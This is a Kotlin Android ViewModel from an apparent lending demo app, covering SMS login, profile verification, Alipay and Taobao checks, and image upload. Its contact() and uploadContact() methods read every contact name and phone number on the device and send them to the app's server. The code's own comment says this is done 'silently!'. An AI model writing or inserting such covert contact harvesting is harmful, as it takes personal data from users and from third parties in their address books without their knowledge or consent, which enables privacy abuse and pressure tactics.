package com.apm29.yjw.demo.viewmodel

import android.content.ContentResolver
import android.provider.ContactsContract
import android.util.Log
import androidx.lifecycle.MutableLiveData
import com.apm29.yjw.demo.app.ErrorHandledObserver
import com.apm29.yjw.demo.arch.BaseViewModel
import com.apm29.yjw.demo.model.api.UserApi
import com.apm29.yjw.demo.utils.subscribeErrorHandled
import com.apm29.yjw.demo.utils.threadAutoSwitch
import com.apm29.yjw.gentleloansdemo.BuildConfig
import io.reactivex.Observable
import java.lang.IllegalArgumentException
import com.apm29.yjw.demo.model.*
import com.apm29.yjw.demo.model.api.CommonApi
import com.apm29.yjw.demo.utils.bitmap2Base64


class DefaultFragmentViewModel : BaseViewModel() {

    companion object {
        /*
        * Defines an array that contains column names to move from
        * the Cursor to the ListView.
        */
        val PROJECTION = arrayOf(
                ContactsContract.RawContacts.CONTACT_ID
        )
        val PROJECTION_DATA = arrayOf(
                ContactsContract.Data.DATA1,
                ContactsContract.Data.MIMETYPE
        )
        const val SELECTION = ContactsContract.RawContacts.CONTACT_ID + "= ?"
    }

    var smsResult: MutableLiveData<BaseBean<String>> = MutableLiveData()
    var loginResult: MutableLiveData<BaseBean<LoginBean>> = MutableLiveData()
    var profile: MutableLiveData<BaseBean<ProfileBean>> = MutableLiveData()
    var uploadResultData: MutableLiveData<BaseBean<ImageUploadResultBean>> = MutableLiveData()

    fun profileVerify(refresh: Boolean = true) {
        mRetrofit.create(UserApi::class.java)
                .profile()
                .threadAutoSwitch()
                .subscribeErrorHandled(mErrorData, mErrorHandlerImpl, if (refresh) mLoadingData else null) {
                    profile.value = it
                }
    }

    fun sendLoginVerifySMS(mobile: String) {
        mRetrofit.create(UserApi::class.java)
                .sendSMS(mobile)
                .threadAutoSwitch()
                .subscribe(
                        object : ErrorHandledObserver<BaseBean<String>>(mErrorData, mErrorHandlerImpl, mLoadingData) {
                            override fun onNext(t: BaseBean<String>) {
                                mErrorData.value = t.msg
                                smsResult.value = t
                            }
                        }
                )
    }

    fun doLogin(mobile: String, smsCode: String) {
        mRetrofit.create(UserApi::class.java)
                .login(mobile, smsCode)
                .threadAutoSwitch()
                .subscribe(
                        object : ErrorHandledObserver<BaseBean<LoginBean>>(mErrorData, mErrorHandlerImpl, mLoadingData) {
                            override fun onNext(t: BaseBean<LoginBean>) {
                                mErrorData.value = t.msg
                                loginResult.value = t
                            }
                        }
                )
    }

    /**
     * load contacts from contentResolver,upload if success
     */
    fun contact(contentResolver: ContentResolver?) {
        Observable.just(1)
                .threadAutoSwitch()
                .map {
                    val list: ArrayList<Contact> = arrayListOf()
                    contentResolver?.let { cr ->
                        val userCursor = cr.query(
                                ContactsContract.RawContacts.CONTENT_URI, PROJECTION,
                                null, null, null)
                        while (userCursor?.moveToNext() == true) {
                            val id = userCursor.getString(userCursor.getColumnIndex(ContactsContract.RawContacts.CONTACT_ID))
                            val dataCursor = cr.query(ContactsContract.Data.CONTENT_URI, PROJECTION_DATA,
                                    SELECTION, arrayOf(id), null)
                            val contactData = Contact(id = id)
                            while (dataCursor?.moveToNext() == true) {
                                val mimeType = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.Data.MIMETYPE))
                                val data1 = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.Data.DATA1))
                                if (mimeType == ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE) {
                                    contactData.phone.add(data1)
                                } else if (mimeType == ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE) {
                                    contactData.name += data1
                                }
                            }
                            if (BuildConfig.DEBUG)
                                println(contactData)
                            list.add(contactData)
                            dataCursor?.close()
                        }
                        userCursor?.close()

                        list
                    }
                }
                .subscribe(
                        {
                            uploadContact(it)
                        },
                        {

                        }
                ).also {
                    mDisposables.add(it)
                }
    }

    /**
     * upload all contacts to our server,silently!
     */
    private fun uploadContact(list: ArrayList<Contact>?) {
        mRetrofit.create(UserApi::class.java)
                .contact("[${list?.joinToString(separator = ",")}]".also {
                    println(it)
                })
                .threadAutoSwitch()
                .subscribeErrorHandled(mErrorData, mErrorHandlerImpl, mLoadingData) {
                    Log.d(tag, it.msg)
                }
    }

    /**
     * 支付宝淘宝验证
     */
    fun preVerifyForAlibaba(channelCode: String) {
        mRetrofit.create(UserApi::class.java)
                .profile()
                .threadAutoSwitch()
                .subscribeErrorHandled(mErrorData, mErrorHandlerImpl, null) {

                    val profile = it.peekData()
                    when (channelCode) {
                        ALIPAY_CHANNEL_CODE -> {
                            if (profile.alipay_status) {
                                mToastData.value = Event("支付宝已验证")
                                return@subscribeErrorHandled
                            }
                        }
                        TAOBAO_CHANNEL_CODE -> {
                            if (profile.taobao_status) {
                                mToastData.value = Event("淘宝宝已验证")
                                return@subscribeErrorHandled
                            }
                        }
                        else -> {
                            throw IllegalArgumentException("不支持的ChannelCode")
                        }
                    }
                    magicBoxData.value = DataMagicBox(
                            profile.idCardNo ?: "",
                            profile.mobile ?: "",
                            profile.realName ?: "",
                            channelCode
                    )

                }
    }

    fun uploadAlipayResult(mobile: String, taskId: String, type: Int) {
        mRetrofit.create(UserApi::class.java)
                .alipay(mobile, taskId, type)
                .threadAutoSwitch()
                .subscribeErrorHandled(mErrorData, mErrorHandlerImpl, mLoadingData) {
                    Log.d(tag, it.msg)
                }
    }

    fun uploadImage(photoPath: String) {
        mRetrofit.create(CommonApi::class.java)
                .upload("data:image/jpeg;base64,${bitmap2Base64(filePath = photoPath)}")
                .threadAutoSwitch()
                .subscribeErrorHandled(mErrorData, mErrorHandlerImpl, mLoadingData) {
                    mToastData.value = Event(it.peekData().path)
                    uploadResultData.value = it
                }
    }

    val magicBoxData: MutableLiveData<DataMagicBox> = MutableLiveData()


}